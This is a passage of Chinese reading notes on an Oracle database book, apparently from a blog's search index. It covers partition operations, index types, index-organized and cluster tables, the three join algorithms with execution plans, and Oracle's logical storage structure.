删除分区表range_part_tab的p9分区\n分区数据转移关于分区表的历史记录的处理，其实是可以分成删除和转移两部分的，关于转移备份的方案，Oracle提供了一个非常棒的工具，就是分区交换，可以实现普通表和分区表的某个分区之间数据的相互交换，他们之间的交换非常快，基本上在瞬间就可以完成。实际上只是Oracle在内部数据字典做的一些小改动而已。\n命令：alter table range_part_tab exchange partition p8 with table mid_table; 不过要注意的一点是，这两张表的字段必须是完全一样的。另外，exchange 是交换的含义，两个表的记录会互换，而不是覆盖。\n分区切割alter table range_part_tab split partition p_max at (TO_DATE(&#39;2024-02-01&#39;,&#39;YYYY-MM-DD&#39;)) into (PARTITION p2024_01,PARTITION P_MAX);\n\n分区切割的三个关键字是split、at&#x2F;values和into。\n如果是RANGE类型的，at部分在此处说明了具体的范围，小于某个指定的值。如果是LIST类型的，使用values。\ninto 部分说明分区被切割成两个分区，比如 into (PARTITION p2024_01,PARTITION P_MAX); 表示将 P_MAX 切割成 PARTITION p2024_01 和 PARTITION P_MAX 两部分，其中括号里的 P_MAX 可以改为新的名字，也可以保留原来的名字。\n不能对HASH类型的分区进行拆分。\n\n分区合并alter table range_part_tab merge partitions p2024_02,p_max into partition p_max;\n\n分区合并的关键字是 merge 和 into。\nmerge 后面跟着的是需要合并的两个分区名。\ninto 部分为合并后的分区名，可以是新的分区名，也可以沿用已存在的分区名。\n合并分区是将相邻的分区合并成一个分区，结果分区将采用较高分区的界限，值得注意的是，不能将分区合并到界限较低的分区。\n\n分区的增与删alter table range_part_tab add partition p2025_01 values less than (TO_DATE(&#39;2025-02-01&#39;,&#39;YYYY-MM-DD&#39;));\n上述语句可以增加分区，不过执行会报错：ORA-14074: Partition Bound Must Collate Higher Than That Of The Last Partition这是因为最后一个分区是less than(maxvalue)的情况下，是不能追加分区的，只能SPLIT分裂。因为追加的分区界限比这个p_max还要低，显然不能允许。不过可以改成先试验分区删除，把这个p_max给删除了，然后追加自然就没问题了。\nalter table range_part_tab drop partition p_max;\n\n分区增加的关键字是add partition，而分区别除的关键字是drop partition。\n由于 max value 分区的存在，无法追加新的分区，必须删除了才可以追加。\n\n分区索引类型全局索引全局索引和普通的建索引无异，基本上可以理解为就是普通索引。\ncreate index idx_part_tab_date on range_part_tab(deal_date);\n局部索引局部索引其实就是针对各个分区所建的索引。和局部索引相比，全局索引好比一个大索引，而局部索引好比13个小索引。\ncreate index idx_part_tab_area on range_part_tab(area_code) local;\n分区表相关陷阱索引频频失效其中最容易出问题的当属分区表的不当操作导致分区索引失效，这些操作就是前面分区操作，这些动作全部都会导致分区索引中的全局索引失效。以下是查看range_part_tab表的索引情况，其中STATUS是N&#x2F;A表示是局部索引，需要进一步在user_ind partitions中分析其索引的状态，如下：\n-- 查看索引情况，其中STATUS是N/A表示是局部索引，需要进一步在user_ind_partitions中分析其索引的状态select index_name, statusfrom user_indexeswhere index_name in (&#x27;IDX_PART_TAB_DATE&#x27;, &#x27;IDX_PART_TAB_AREA&#x27;);-- 查看局部索引状态select index_name, partition_name, statusfrom user_ind_partitionswhere index_name = &#x27;IDX_PART_TAB AREA&#x27;;\n\n\nstatus USABLE 表示索引可用，UNUSABLE 表示索引不可用\n\n其实分区表的分区操作，对局部索引一般都没有影响，但是对全局索引影响比较大。Oracle 在提供这些分区操作时提供了一个很有用的参数 update global indexes,可以有效地避免全局索引失效。其实这个参数的本质动作是在分区操作做完后，暗暗执行了索引重建的工作。使用方式：alter table range_part_tab truncate partition p2 update global indexes;\n有索引反而效率更低有时加上索引，分区表的查询效率反而不如普通表。这个问题涉及索引的特性，就是索引的高度一般比较低。下一章索引里细说，下一章有整整136页。索引真是数据库一大知识点啊\n无法应用分区条件在分区设计时，往往没有预先规划好如何应用分区，这是很不应该的。操作分区表时，应该用上分区条件，否则无法做到分区消除，这就浪费了分区表的宝贵特性，应该避免出现。有无分区条件性能差别很大。\n有趣的索引组织表普通堆表操作时，如果有用到索引，需要先从索引中获取rowid,然后定位到表中，获取id以外的其他列，这就是回表。如果查询列含索引列以外的列，回表就不可避免。\n分别建普通表和索引组织表并插入部分数据，其中的organization index关键字就是索引组织表的语法，索引组织表必须有主键。\ndrop table heap_addresses purge;drop table iot_addresses purge;create table heap_addresses(    empno     number(10),    addr_type varchar2(10),    street    varchar2(10),    city      varchar2(10),    state     varchar2(2),    zip       number,    primary key (empno))create table iot_addresses(    empno     number(10),    addr_type varchar2(10),    street    varchar2(10),    city      varchar2(10),    state     varchar2(2),    zip       number,    primary key (empno))    organization indexinsert into heap_addressesselect object_id, &#x27;WORK&#x27;, &#x27;123street&#x27;, &#x27;washington&#x27;, &#x27;DC&#x27;, 20123from all_objects;insert into iot_addressesselect object_id, &#x27;WORK&#x27;, &#x27;123street&#x27;, &#x27;washington&#x27;, &#x27;DC&#x27;, 20123from all_objects;\n\n下面是简单的查询性能比较。\nSQL&gt; select * from heap_addresses where empno = 22;Elapsed: 00:00:00.29Execution Plan----------------------------------------------------------Plan hash value: 128237854----------------------------------------------------------------------------------------------| Id  | Operation                   | Name           | Rows  | Bytes | Cost (%CPU)| Time     |----------------------------------------------------------------------------------------------|   0 | SELECT STATEMENT            |                |     1 |    50 |     1   (0)| 00:00:01 ||   1 |  TABLE ACCESS BY INDEX ROWID| HEAP_ADDRESSES |     1 |    50 |     1   (0)| 00:00:01 ||*  2 |   INDEX UNIQUE SCAN         | SYS_C008415    |     1 |       |     1   (0)| 00:00:01 |----------------------------------------------------------------------------------------------Predicate Information (identified by operation id):---------------------------------------------------   2 - access(&quot;EMPNO&quot;=22)Statistics----------------------------------------------------------          2  recursive calls          3  db block gets          7  consistent gets          0  physical reads        716  redo size        935  bytes sent via SQL*Net to client         83  bytes received via SQL*Net from client          1  SQL*Net roundtrips to/from client          0  sorts (memory)          0  sorts (disk)          1  rows processedSQL&gt; select * from iot_addresses where empno = 22;Elapsed: 00:00:00.33Execution Plan----------------------------------------------------------Plan hash value: 268113143---------------------------------------------------------------------------------------| Id  | Operation         | Name              | Rows  | Bytes | Cost (%CPU)| Time     |---------------------------------------------------------------------------------------|   0 | SELECT STATEMENT  |                   |     1 |    50 |     1   (0)| 00:00:01 ||*  1 |  INDEX UNIQUE SCAN| SYS_IOT_TOP_72627 |     1 |    50 |     1   (0)| 00:00:01 |---------------------------------------------------------------------------------------Predicate Information (identified by operation id):---------------------------------------------------   1 - access(&quot;EMPNO&quot;=22)Statistics----------------------------------------------------------          1  recursive calls          0  db block gets          4  consistent gets          0  physical reads        140  redo size       1084  bytes sent via SQL*Net to client        108  bytes received via SQL*Net from client          2  SQL*Net roundtrips to/from client          0  sorts (memory)          0  sorts (disk)          1  rows processed\n\n索引组织表的逻辑读是4而普通表的逻辑读是7，另外普通表读取主键索引后，为了获取索引列以外的列信息，产生了回表TABLE ACCESS BY INDEX ROWID，而索引组织表没有。索引组织表最大的特点就是，表就是索引，索引就是表，这是一种很特别的设计，所以无须访问表。不过这种设计的表的更新要比普通表开销更大。因为表要和索引一样有序地排列，更新负担将会非常严重。因此这种设计一般适用在很少更新、频繁读的应用场合，比如配置表，这种表数据一般很少变动，却大量读取。\n簇表的介绍及应用普通表还有一点缺陷，就是ORDER BY语句中的排序不可避免。实际上有序族表可以避免排序。\nDrop table cust_orders;Drop cluster shc;CREATE CLUSTER shc(    cust_id NUMBER,    order_dt timestamp SORT)HASHKEYS 10000HASH IS cust_idSIZE 8192CREATE TABLE cust_orders(    cust_id      number,    order_dt     timestamp SORT,    order_number number,    username     varchar2(30),    ship_addr    number,    bill_addr    number,    invoice_num  number)    CLUSTER shc (cust_id, order_dt)\n\nSQL&gt; set autotrace traceonly explainSQL&gt; variable x numberSQL&gt; select cust_id,order_dt,order_number from cust_orders where cust_id =:x order by order_dt;Elapsed: 00:00:00.31Execution Plan----------------------------------------------------------Plan hash value: 465084913----------------------------------------------------------------------| Id  | Operation         | Name        | Rows  | Bytes | Cost (%CPU)|----------------------------------------------------------------------|   0 | SELECT STATEMENT  |             |     1 |    39 |     0   (0)||*  1 |  TABLE ACCESS HASH| CUST_ORDERS |     1 |    39 |            |----------------------------------------------------------------------Predicate Information (identified by operation id):---------------------------------------------------   1 - access(&quot;CUST_ID&quot;=TO_NUMBER(:X))Note-----   - dynamic statistics used: dynamic sampling (level=2)\n\n关于避免排序，还有另外一种方法，也是更常见的方法：排序列正好是索引列时，可避免排序。关于索引避免排序这个知识，也会在下一章与索引相关的部分做详细的介绍。簇表和索引组织表一样，由于结构的特殊导致更新操作开销非常大，所以也需要谨慎使用。\n","categories":["读书笔记"],"tags":["数据库","《收获，不止Oracle》","Oracle"]},{"title":"《收获，不止Oracle》读书笔记上篇-表连接","url":"/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E3%80%8A%E6%94%B6%E8%8E%B7%EF%BC%8C%E4%B8%8D%E6%AD%A2Oracle%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%E4%B8%8A%E7%AF%87-%E8%A1%A8%E8%BF%9E%E6%8E%A5/","content":"第六章 - 经典，表的连接学以致用三种连接类型嵌套循环连接（Nested Loop Join）、哈希连接（Hash Join）和排序合并连接（Sort Merge Join）是Oracle数据库中最常用的三种连接算法。\n嵌套循环连接（Nested Loop Join）嵌套循环连接是最简单的连接方法之一，它通过遍历一个表（外部表），对于外部表中的每一行，再遍历另一个表（内部表）来查找匹配的行。\n\n选择一个较小的表作为外部表。通常，外部表是较小的表或已经被索引访问的表。\n遍历外部表的每一行。\n对于外部表中的每一行，遍历内部表以查找匹配的行。如果找到匹配的行，则将这两行组合在一起作为结果的一部分。\n\n当一个表很小或者已经被索引访问时，嵌套循环连接可以非常高效。如果内部表很大，则嵌套循环连接可能会非常慢。对于大数据量的表，嵌套循环连接可能会导致性能问题。\n哈希连接（Hash Join）哈希连接是一种高效的连接算法，它通过在内存中创建哈希表来查找匹配的行。\n\n选择一个较大的表作为内部表。对于内部表中的每一行，根据连接键计算哈希值，并将该行存储在一个哈希表中。\n遍历外部表。对于外部表中的每一行，根据连接键计算哈希值，并在哈希表中查找匹配的行。如果找到匹配的行，则将这两行组合在一起作为结果的一部分。\n\n当内部表可以完全装入内存时很高效，可以处理较大的数据集。但如果内部表太大以至于无法完全装入内存，则性能可能会受到影响。哈希表的构建可能会消耗较多的内存资源。\n排序合并连接（Sort Merge Join）排序合并连接是一种连接算法，它通过先对两个表进行排序，然后通过比较排序后的键值来查找匹配的行。\n\n对两个表按照连接键进行排序。如果表已经排序或可以通过索引访问，则可以跳过此步骤。\n遍历两个排序后的表。比较两个表中当前行的连接键值。如果键值相同，则将这两行组合在一起作为结果的一部分。\n\n当连接键的值有序时，排序合并连接非常高效。可以处理大数据量。但如果表未排序，则需要额外的排序步骤，这可能会消耗时间和磁盘空间。当表很大时，排序可能会很慢。\n各类连接访问次数差异可以使用alter session set statistics_level = all进行跟踪。这条命令用于设置会话级别的统计信息级别。作用是开启尽可能多的统计信息收集，以便于诊断和性能调优。可以知道表的访问次数。\n嵌套循环的表访问次数准备表和数据\nDROP TABLE t1 CASCADE CONSTRAINTS PURGE;DROP TABLE t2 CASCADE CONSTRAINTS PURGE;execute dbms_random.seed(0);create table t1 asSELECT rownum                      id,       rownum                      n,       dbms_random.string(&#x27;a&#x27;, 50) contentsFROM dualCONNECT BY level &lt;= 100ORDER BY dbms_random.random;create table t2 asSELECT rownum                      id,       rownum                      t1_id,       rownum                      n,       dbms_random.string(&#x27;b&#x27;, 50) contentsFROM dualCONNECT BY level &lt;= 100000ORDER BY dbms_random.random;\n\n查看嵌套循环的连接次数。\nSQL&gt; set linesize 1000SQL&gt; alter session set statistics_level = all;Session altered.SQL&gt; SELECT /*+leading(t1) use_nl(t1 t2)*/ * FROM t1,t2 WHERE t1.id = t2.t1_id;-- 省略结果集SQL&gt; select * from table(dbms_xplan.display_cursor(null,null,&#x27;allstats last&#x27;));PLAN_TABLE_OUTPUT-------------------------------------------------------------------------------------------------SQL_ID  f7haq9xwppqqf, child number 0-------------------------------------SELECT /*+leading(t1) use_nl(t1 t2)*/ * FROM t1,t2 WHERE t1.id = t2.t1_idPlan hash value: 1967407726-------------------------------------------------------------------------------------| Id  | Operation          | Name | Starts | E-Rows | A-Rows |   A-Time   | Buffers |-------------------------------------------------------------------------------------|   0 | SELECT STATEMENT   |      |      1 |        |    100 |00:00:00.33 |   98515 |PLAN_TABLE_OUTPUT-------------------------------------------------------------------------------------------------|   1 |  NESTED LOOPS      |      |      1 |    100 |    100 |00:00:00.33 |   98515 ||   2 |   TABLE ACCESS FULL| T1   |      1 |    100 |    100 |00:00:00.01 |       9 ||*  3 |   TABLE ACCESS FULL| T2   |    100 |      1 |    100 |00:00:00.33 |   98506 |-------------------------------------------------------------------------------------Predicate Information (identified by operation id):---------------------------------------------------   3 - filter(&quot;T1&quot;.&quot;ID&quot;=&quot;T2&quot;.&quot;T1_ID&quot;)21 rows selected.\n\nStarts 这列表示表访问的次数。这里 t1 被访问了1次，t2 被访问了 100 次。\n下面还有三条不同i情况的语句，就不一一贴详细执行过程，直接说结果了。SELECT /*+leading(t1) use_nl(t1 t2)*/ * FROM t1,t2 WHERE t1.id = t2.t1_id and t1.n in (17,19); t2 表被访问2次SELECT /*+leading(t1) use_nl(t1 t2)*/ * FROM t1,t2 WHERE t1.id = t2.t1_id and t1.n 19; t2 表被访问1次SELECT /*+leading(t1) use_nl(t1 t2)*/ * FROM t1,t2 WHERE t1.id = t2.t1_id and t1.n = 999999999; t2 表被访问0次\n原因也很简单，和 t1 表中返回的数据数量有关。在嵌套循环连接中，驱动表返回多少条记录，被驱动表就访问多少次。\n此外，这里使用 /*+leading(t1) use_nl(t1 t2)*/ 这个 HINT。其中use_nl表示强制用嵌套循环连接方式。leading(t1)表示强制先访问 t1 表，也就是 t1 表作为驱动表。\n哈希连接的表访问次数SQL&gt; SELECT /*+leading(t1) use_hash(t1 t2)*/ * FROM t1,t2 WHERE t1.id = t2.t1_id;-- 省略结果集SQL&gt; select * from table(dbms_xplan.display_cursor(null,null,&#x27;allstats last&#x27;));PLAN_TABLE_OUTPUT----------------------------------------------------------------------------------------------------------------SQL_ID  bgn80s3r4xwq9, child number 0-------------------------------------SELECT /*+leading(t1) use_hash(t1 t2)*/ * FROM t1,t2 WHERE t1.id =t2.t1_idPlan hash value: 1838229974----------------------------------------------------------------------------------------------------------------| Id  | Operation          | Name | Starts | E-Rows | A-Rows |   A-Time   | Buffers |  OMem |  1Mem | Used-Mem |----------------------------------------------------------------------------------------------------------------|   0 | SELECT STATEMENT   |      |      1 |        |    100 |00:00:00.02 |     994 |       |       |          |PLAN_TABLE_OUTPUT----------------------------------------------------------------------------------------------------------------|*  1 |  HASH JOIN         |      |      1 |    100 |    100 |00:00:00.02 |     994 |  1000K|  1000K| 1329K (0)||   2 |   TABLE ACCESS FULL| T1   |      1 |    100 |    100 |00:00:00.01 |       2 |       |       |          ||   3 |   TABLE ACCESS FULL| T2   |      1 |    100K|    100K|00:00:00.01 |     992 |       |       |          |----------------------------------------------------------------------------------------------------------------Predicate Information (identified by operation id):---------------------------------------------------   1 - access(&quot;T1&quot;.&quot;ID&quot;=&quot;T2&quot;.&quot;T1_ID&quot;)21 rows selected.\n\n在HASH连接中，驱动表和被驱动表都只会访问0次或者1次。\n哈希连接中，只有构建哈希表这一步需遍历驱动表一次。哈希表构建完成后，后续的查找阶段不再需要访问驱动表，而是直接在哈希表中查找匹配项。被驱动表同理。当驱动表中没有符合条件的数据时，便不会访问被驱动表。当查询条件始终不成立时（比如 where 1 &#x3D; 2），也不会访问驱动表。\n排序合并的表访问次数SQL&gt; SELECT /*+ordered use_merge(t1 t2)*/ * FROM t1,t2 WHERE t1.id = t2.t1_id;-- 省略结果集SQL&gt; select * from table(dbms_xplan.display_cursor(null,null,&#x27;allstats last&#x27;));PLAN_TABLE_OUTPUT--------------------------------------------------------------------------------------------------------------------------SQL_ID  bgs49pws4vu8d, child number 0-------------------------------------SELECT /*+ordered use_merge(t1 t2)*/ * FROM t1,t2 WHERE t1.id = t2.t1_idPlan hash value: 412793182--------------------------------------------------------------------------------------------------------------------------| Id  | Operation           | Name | Starts | E-Rows | A-Rows |   A-Time   | Buffers | Reads  |  OMem |  1Mem | Used-Mem |--------------------------------------------------------------------------------------------------------------------------|   0 | SELECT STATEMENT    |      |      1 |        |    100 |00:00:00.07 |     987 |    982 |       |       |          ||   1 |  MERGE JOIN         |      |      1 |    100 |    100 |00:00:00.07 |     987 |    982 |       |       |          |PLAN_TABLE_OUTPUT--------------------------------------------------------------------------------------------------------------------------|   2 |   SORT JOIN         |      |      1 |    100 |    100 |00:00:00.01 |       2 |      1 | 13312 | 13312 |12288  (0)||   3 |    TABLE ACCESS FULL| T1   |      1 |    100 |    100 |00:00:00.01 |       2 |      1 |       |       |          ||*  4 |   SORT JOIN         |      |    100 |    100K|    100 |00:00:00.07 |     985 |    981 |  9762K|  1209K| 8677K (0)||   5 |    TABLE ACCESS FULL| T2   |      1 |    100K|    100K|00:00:00.05 |     985 |    981 |       |       |          |--------------------------------------------------------------------------------------------------------------------------Predicate Information (identified by operation id):---------------------------------------------------   4 - access(&quot;T1&quot;.&quot;ID&quot;=&quot;T2&quot;.&quot;T1_ID&quot;)       filter(&quot;T1&quot;.&quot;ID&quot;=&quot;T2&quot;.&quot;T1_ID&quot;)PLAN_TABLE_OUTPUT--------------------------------------------------------------------------------------------------------------------------23 rows selected.\n\n在访问次数上，排序合并连接和HASH连接是一样的，两表都只会访问0次或者1次。关于0次的试验这里就不再举例了。排序合并连接根本就没有驱动和被驱动的概念，而嵌套循环和哈希连接要考虑驱动和被驱动情况。\n排序合并连接，也只有在排序时才需要访问表，排序完成后，后续的合并阶段不需要访问表，只需要从排序结果中查找匹配项即可。\n各类连接驱动顺序区别观察两表的前后访问顺序对调后的性能差异。\n嵌套循环的表驱动顺序SELECT /*+leading(t1) use_nl(t1 t2)*/ * FROM t1,t2 WHERE t1.id = t2.t1_id and t1.n = 19; t1 表被访问 1 次，t2 表被访问 1 次。使用 Buffers 989SELECT /*+leading(t2) use_nl(t1 t2)*/ * FROM t1,t2 WHERE t1.id = t2.t1_id and t1.n = 19; t1 表被访问 100k 次，t2 表被访问 1 次。使用 Buffers 200k\n在嵌套循环连接中驱动表的顺序非常重要，性能差异十分明显。嵌套循环连接要特别注意驱动表的顺序，小的结果集先访问，大的结果集后访问，才能保证被驱动表的访问次数降到最低，从而提升性能。\n哈希连接的表驱动顺序SELECT /*+leading(t1) use_hash(t1 t2)*/ * FROM t1,t2 WHERE t1.id = t2.t1_id and t1.n = 19; t1 表被访问 1 次，t2 表被访问 1 次。使用 Buffers 988，Used-Mem 416k ，耗时 0.02sSELECT /*+leading(t2) use_hash(t1 t2)*/ * FROM t1,t2 WHERE t1.id = t2.t1_id and t1.n = 19; t1 表被访问 1 次，t2 表被访问 1 次。使用 Buffers 988，Used-Mem 13M ，耗时 0.03s\n其中 Buffers 相同，但 Used-Mem 差异非常大，说明排序尺寸差异明显。时间也可以看出一些哈希连接中驱动表的顺序非常重要，性能也差别明显。\n排序合并的表驱动顺序SELECT /*+leading(t1) use_merge(t1 t2)*/ * FROM t1,t2 WHERE t1.id = t2.t1_id and t1.n = 19; t1 表被访问 1 次，t2 表被访问 100k 次。使用 Buffers 987，Used-Mem 分别是 2048 和 8677k ，耗时 0.04sSELECT /*+leading(t2) use_merge(t2 t1)*/ * FROM t1,t2 WHERE t1.id = t2.t1_id and t1.n = 19; t1 表被访问 1 次，t2 表被访问 100k 次。使用 Buffers 987，Used-Mem 分别是 2048 和 8677k ，耗时 0.05s\n嵌套循环连接和哈希连接有驱动顺序，驱动表的顺序不同将影响表连接的性能，而排序合并连接没有驱动的概念，无论哪张表在前都无妨。\n各类连接排序情况分析嵌套循环和哈希连接无需排序嵌套循环的执行计划中没有 Used-Mem 信息，说明没有排序。哈希连接也没有排序，虽然执行计划中有 Used-Mem 信息。但消耗的内存是用于建立哈希表的。\n排序只需取部分字段SELECT /*+leading(t1) use_merge(t1 t2)*/ t1.id FROM t1,t2 WHERE t1.id = t2.t1_id and t1.n = 19;SELECT /*+leading(t1) use_merge(t1 t2)*/ * FROM t1,t2 WHERE t1.id = t2.t1_id and t1.n = 19;\n上面第一条sql只取部分字段，比第二条sql取全部字段所消耗的内存更小。在PGA空间不足以容纳排序区，导致排序需要在磁盘上进行时，那么性能会出现数量级的下降。\n各类连接限制场景对比一般来说 HINT 是 Oracle 提供的用来强制走某执行计划的一个工具，比如你不想让 Oracle 的某查询走索引而要走全表扫描，你使用 full() 的提示就可以达成目的，反之亦是如此。但是如果你用 HINT 将导致 Oracle 的运行结果有错，或者是 Oracle 在特定场景下无法支持这个 HINT 的执行计划，那就无法如你所愿。比如之前的 COUNT(*) 的优化，如果你的索引列没有定义为非空属性，无论如何使用 INDEX() 的 HINT ，都不可能让 Oracle 走索引的，因为索引不能存储空值，用索引来统计将得到一个错误的结果，这是无法容忍的，所以 HINT 是无法生效的。同样，这里与表连接相关的三个 HINT 分别是 use_nl、use_hash 和 use_merge ，如果在特定的写法下，用这些 HINT 也无法达成所愿。\n哈希连接的限制哈希连接不支持不等值连接&lt;&gt;，不支持&gt;和&lt;的连接方式，也不支持LIKE的连接方式。\n排序合并的限制排序合并连接不支持&lt;&gt;的连接条件，也不支持LIKE的连接条件，但是比起哈希连接，支持面要广一些，支持&gt;之类的连接条件。\n嵌套循环无限制嵌套循环支持所有的sql连接条件写法，没有任何限制。\n索引与各表连接经典优化嵌套循环与索引嵌套索引的原理前面有写过，先从驱动表过滤出符合条件的记录，再去被驱动表匹配符合条件的记录，最后将结果组合在一起返回。从两个表中匹配数据的过程可以使用索引提高性能，在过滤条件或连接条件有索引时，可以大大提高查询效率。一般在驱动表的过滤条件加索引、在被驱动表的连接条件加索引比较合理。\n适合嵌套循环连接的场景\n\n两表关联返回的记录不多，最佳情况是驱动表结果集仅返回1条或少量几条记录，而被驱动表仅匹配到1条或少量几条记录，这种情况即便T1表和T2表的记录奇大无比，也是非常迅速的。\n遇到一些不等值查询导致哈希和排序合并连接被限制使用，不得不使用L连接。\n驱动表的限制条件所在的列有索引。\n被驱动表的连接条件所在的列有索引。\n\n哈希连接与索引哈希连接、排序合并连接和嵌套循环连接最大的差别在于，连接条件的索引对它们起不到传递的作用。对于哈希连接和排序合并连接来说，索引的连接条件起不到快速检索的作用，但是限制条件列如果有适合的索引可以快速检索到少量记录，还是可以提升性能的。因此关于哈希连接与索引的关系可以理解为单表索引的设置技巧，这在之前的索引章节中己经详细叙说过了。\n此外两表关联等值查询，在没有任何索引的情况下，Oracle 倾向于走哈希连接这种算法，因为哈希连接的算法本身还是比较高效先进的。哈希连接需要在 PGA 中的HASH AREA SIZE中完成，因此增大HASH AREA SIZE也是优化哈希连接的一种有效的途径，一般在内存自动管理的情况下，只要加大PGA区大小即可。\n排序合并与索引排序合并连接上的连接条件虽然没有检索的作用，却有消除排序的作用。索引本身排序，可以有效地避免排序合并连接中的排序。此外，还有一个和哈希连接类似的优化思路，就是增大内存排序区，避免在排序尺寸过大时在磁盘中排序。\n","categories":["读书笔记"],"tags":["数据库","《收获，不止Oracle》","Oracle"]},{"title":"《收获，不止Oracle》读书笔记上篇-逻辑体系","url":"/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E3%80%8A%E6%94%B6%E8%8E%B7%EF%BC%8C%E4%B8%8D%E6%AD%A2Oracle%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%E4%B8%8A%E7%AF%87-%E9%80%BB%E8%BE%91%E4%BD%93%E7%B3%BB/","content":"第三章 - 神奇，走进逻辑体系世界逻辑体系结构上一章中讲的Oracle体系的物理结构都是一些看得见摸到着的东西。登录数据库所在的主机，实实在在地体验了SGA共享内存段是如何被开辟而又如何消亡、后台进程是如何被唤起而又如何退出。此外也清楚地看到了数据文件、参数文件、控制文件、日志文件、归档文件的大小及位置。因此物理结构实质上可以理解为我们在物理上可以实实在在看得见的东西。\n而这一章说的体系结构的逻辑结构正是从体系物理结构图中的数据文件部分展开描述的。如下图圆圈标记处所示\n\n这里数据文件是存放数据之处，也是数据库存在的根本！下面介绍的逻辑结构是：表空间(TABLESPACE)、段(SEGMENT)、区(EXTENT)、块(BLOCK)。ORACLE SERVER 正是条理地通过表空间以及段、区、块控制磁盘空间的合理高效的使用，看下图\n\n数据库(DATABASE)由若干表空间(TABLESPACE)组成，表空间(TABLESPACE)由若干段(SEGMENT)组成，段(SEGMENT)由若干区(EXTENT)组成，区(EXTENT)又是由Oracle的最小单元块(BLOCK)组成的。其中表空间又包含系统表空间、回滚段表空间、临时表空间、用户表空间。除了用户表空间外其他三种表空间有各自特定的用途，不可随意更改和破坏，尤其是系统表空间更是需要小心谨慎保护。\n\n块 -&gt; 区 -&gt; 段 -&gt; 表空间 -&gt; 数据库\n\n刚才是从大说到小，现在按照从小到大的方向再将它们描述一遍。一系列连续的BLOCK组成了EXTENT,一个或多个EXTENT组成了SEGMENT,一个或多个SEGMENT组成了TABLESPACE,而一个或多个TABLESPACE组成了DATABASE(一个DATABASE想存在，至少需要有SYSTEM及UNDO表空间)。\n到这里还是十分的抽象，理解不了一点。比如之前执行的 update t set object_id=92 where object_id=29; 这里的t表对应的就是逻辑结构，而数据则是写入数据文件 datafile 里。面对表操作肯定比面对数据文件直观形象得多，这个表是就从数据文件里直观抽象出来的逻辑结构。\n前面说到 Oracle 的逻辑结构从大到小分为表空间、段、区、数据库块这4部分。上面建的表是和段(SEGMENT)直接对应。但是表并不是只对应一个段，有数据段和索引段。此外，如果表有分区，每个分区又都独立成段。\n段(SEGMENT)是由区(EXTENT)组成的，而区又是由一系列数据块(BLOCK)组成的。那么为什么要存在区呢？块是数据库的最小单位，为什么不直接由块组成段呢？\nOracle的这个区(EXTENT)的设计是为了避免过度扩展。因为块的尺寸太小了，如果以这个块的尺寸为单位进行扩展，那么拓展会过于频繁，从而影响性能。\n块虽然说BLOCK是Oracle的最小逻辑数据单位，但是所有数据在文件系统层面最小物理存储单位是字节，操作系统也有一个类似Oracle的块容量的参数(block size),但是Oracle总是访问整个Oracle BLOCK,而不是按照操作系统的block size来访问的。一般情况下大多数操作系统OS的块容量为512字节大小或其整数倍，而数据库块一般默认设置为8KB,除此之外也有系统将其设置为2KB、4KB、16KB、32KB、64KB等其他大小。但是数据库的BLOCK一般要设置为操作系统OS块容量的整数倍，这样可以减少IO操作。\n这个很好理解，和操作系统内存管理的分页有些类似。比如IO的大小设置为512字节(0.5KB),本来如果DB的BLOCK设置为1KB正好是其2倍。但是设置为0.8KB,这时由于操作系统的单个块大小为0.5KB,只有2个操作系统块才可容纳下，于是就动用了2个OS块去容纳，相当于占用了1KB大小的OS空间，浪费了0.2KB。\nOracle的数据库块并不是简单地往里插数据，插满了装不下了就插入另一个数据块这么简单，而是额外提供了一定的管理功能。数据库的组成分为数据块头（包括标准内容和可变内容）(common and variable header)、表目录区(tabledirectory)、行目录区(row directory)、可用空间区(free space)、行数据区(row data)这5个部分，如下图：\n\n\n数据块头(header)中包含了此数据块的概要信息，例如块地址(block address)及此数据块所属的段(segment)的类型（比如到底是表还是索引）。\n表目录存放了块中行数据所在的表的信息。\n行目录存放了插入的行的地址。\n可用空间区就是块中的空余空间.这个空余的多少由Oracle的PCTFREE参数设置，如果是1O,表示该块将会空余10%左右的空间。此外如果是表或者索引块，该区域还会存储事务条目，大致有23字节左右开销。至于为什么要有空余，后面会有解释。\n行数据区域就是存储具体的行的信息或者索引的信息，这部分占用了数据块绝大部分的空间。\n\n这里数据块头(data block header)、表目录区(table directory)、行目录区(row directory)被统称为管理开销(overhead),其中有些开销的容量是固定的，而有些开销的总容量是可变的。数据块中固定及可变管理开销的容量平均在84到107字节(byte)之间。\n段一些连续的数据块(data block)组合在一起，就形成了区(EXTENT)。EXTENT是Oracle数据库分配空间的最小单位，请注意分配这两个字眼。\n当某用户创建一张表T时，实质就是建了一个数据段segment T。在Oracle数据库中，只要segment创建成功，数据库就一定为其分配了包含若干数据块(data block)的初始数据扩展(initial extent),即便此时表中还没数据，但是这些初始数据扩展中的数据块已经为即将插入的数据做好准备了。接下来T表（也就是SEGMENT T)中开始插入数据，很快初始数据扩展中的数据块都装满了，而且又有新数据插入需要空间，此时Oracle会自动为这个段分配一个新增数据扩展(incremental extent),这个新增数据扩展是一个段中已有数据扩展之后分配的后续数据扩展，容量大于或等于之前的数据扩展。\n每个段(segment)的定义中都包含了数据扩展(extent)的存储参数(storage parameter)。存储参数适用于各种类型的段。这个参数控制着Oracle如何为段分配可用空间。例如，用户可以在CREATE TABLE语句中使用STORAGE子句设定存储参数，决定创建表时为其数据段(data segment)分配多少初始空间，或限定一个表最多可以包含多少数据扩展。如果用户没有为表设定存储参数，那么表在创建时使用所在表空间(tablespace)的默认存储参数。\n在一个本地管理的表空间中（注：还有一种数据字典管理的表空间，因为是一种要被淘汰的技术，这里就不提及了)，其中所分配的数据扩展(extent)的容量既可以是用户设定的固定值，也可以是由系统自动决定的可变值，取决于用户创建tablespace时用UNIFORM指令（固定大小）还是AUTOALLOCATE指令（由系统管理）。对于固定容量(UNIFORM)的数据扩展，用户可以为数据扩展设定容量（比如100MB、1GB等随你设定)或使用默认大小(1MB)。用户必须确保每个数据扩展的容量至少能包含5个数据库块(database block)。本地管理(locally managed)的临时表空间(temporary 